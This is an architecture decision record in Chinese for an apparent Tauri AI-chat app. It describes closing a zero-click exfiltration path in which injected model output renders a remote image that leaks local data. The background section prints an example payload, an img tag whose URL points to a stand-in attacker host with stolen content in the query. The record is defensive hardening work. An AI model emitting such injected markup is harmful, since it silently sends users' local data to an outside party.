# 0054 渲染层外泄通道收口：启用 CSP、markdown 外部资源 fail-closed 与密钥不回显

Status: implemented

## 背景

2026-11-01 架构评估（机器复核）确认渲染层存在一条**零点击数据外泄链路**，可被模型输出注入触发：

1. `src-tauri/tauri.conf.json` 的 `app.security.csp` 为 `null`（Tauri 仅在 csp 有值时生成 header 与 nonce），`index.html` 的 CSP meta 亦被注释 ⇒ **实际无任何 CSP**。
2. `src/lib/markdown.ts` 的 `SAFE_TAGS` 含 `img` 且允许 `src`，DOMPurify 未设 `ALLOWED_URI_REGEXP` ⇒ 任意 `https://` 远程图片可加载；注释声称的 `isSafeUrl()` 在代码中**并不存在**。
3. `MarkdownRenderer.vue` 无任何点击拦截，`<a target="_blank">` 由 WebView 自行导航，**不过**外链白名单（真值源 `src-tauri/src/platform.rs` 的 `ALLOWED_OPEN_HOSTS`）。
4. `src-tauri/src/lib.rs` 的 `get_service_api_key` 直接把服务密钥明文回传前端，`ConfigGeneralSection.vue` 回填进 input。

组合后果：被注入的 `<img src="https://attacker/?q=<窃得内容>">` 可在用户零交互下把本地数据发出去；无 CSP 时该请求不受任何策略约束。

同一波还修复了两条同源缺陷：流事件 `sessionId` 缺省即被当前会话吸收（fail-open），以及工具执行器用共享 `Mutex<DispatchContext>` 承载 turn 级授权事实（并发会话互相污染）。

## 候选方案

### 方案 A：只依赖后端净化（让 Rust 侧重写 markdown）
- **落选原因**：渲染在 WebView，最终解释器是浏览器；只在后端清洗无法约束用户后续任何 `v-html` 注入面，且改动面远大于前端消毒。

### 方案 B：只开 CSP，不改 markdown（选中为**部分**方案，被否决为完整方案）
- **落选原因**：CSP 是第二道闸，不是唯一闸。若 `img-src` 给 `https:`（为保留远程图片），外泄通道原样存在；若不给，markdown 图片全废却没有替代交互。必须先在前端消毒阶段决定「哪些外部资源允许存在」。

### 方案 C：CSP 严格化 + markdown 消毒 fail-closed + 链接走白名单 + 密钥仅回掩码（选中方案）
- **落点**：
  - `tauri.conf.json`：`default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost <已知域>; object-src/frame-src/media-src/worker-src 'none'; base-uri 'self'; form-action 'self'`。
  - `markdown.ts`：`ALLOWED_EXTERNAL_HOSTS` 与 `platform.rs` 同源；远程/协议相对 `img` 整元素移除，`data:image` 与站内相对保留；非白名单 `a[href]` 剥离 `href/target/rel`，保留文本。
  - `MarkdownRenderer.vue`：点击拦截，白名单 https 走 `openExternalUrl`，其余 `preventDefault` 并提示。
  - `lib.rs`：`get_service_api_key` 只回掩码；前端改「已配置显示掩码、编辑即清空、重输覆盖」。
- **已知取舍（显式承认）**：Tauri codegen 会为 `index.html` 内联 `<style>` 注入 nonce，若保留该注入则 `style-src 'unsafe-inline'` 在 CSP3 下失效，Vue `:style` 全部被拦、UI 崩溃。故设置 `dangerousDisableAssetCspModification: ["style-src"]`，**只**关闭 style-src 的 nonce 改写，`script-src` 仍受 Tauri nonce 保护。代价是 style-src 保留 `unsafe-inline`（内联样式注入面仍在，但样式注入不构成数据外泄）。

### 方案 D：保留 `sessionId` 缺省放行，仅加告警
- **落选原因**：告警不等于拦截。缺省放行意味着任一缺 `sessionId` 的事件都可能写进当前会话的 phase/流缓冲，属跨会话数据污染，必须 fail-closed；代价是后端必须保证每条事件都带 `sessionId`（本波已补齐 `turn_stream.rs` 两处 `None`）。

## 决策

1. 生产 CSP 唯一真值源是 `tauri.conf.json` 的 `app.security.csp`；`index.html` 的 CSP meta 保持注释并注明理由（启用会打断 dev：Vite 需要内联客户端）。
2. markdown 外部资源 fail-closed：远程图片不加载，非白名单外链不产生可点击导航。
3. 密钥永不回传明文，前端只能拿到掩码与「是否已配置」。
4. 流事件按 `sessionId` 严格匹配；后端必须为每条事件填 `sessionId`。
5. 工具执行的 turn 级授权事实改为随每次调用传入，删除共享可变上下文。

## 影响

1. 用户可见行为变化：markdown 中的远程图片不再显示（改为不可加载态），外链需在白名单内才能打开；配置页 API Key 显示为掩码。
2. 新增 CSP 后，任何前端新增外部请求（如遥测 ingest 端点变更）必须同步更新 `connect-src`——`release.yml` 的 `VITE_PONYSENTRY_INGEST_URL` 默认值与 `connect-src` 属同源事实，改一处必须改另一处。
3. `dangerousDisableAssetCspModification` 的 style-src 例外是已知弱点，若未来 Vue 侧消除内联 style，应删除该例外并移除 `'unsafe-inline'`。
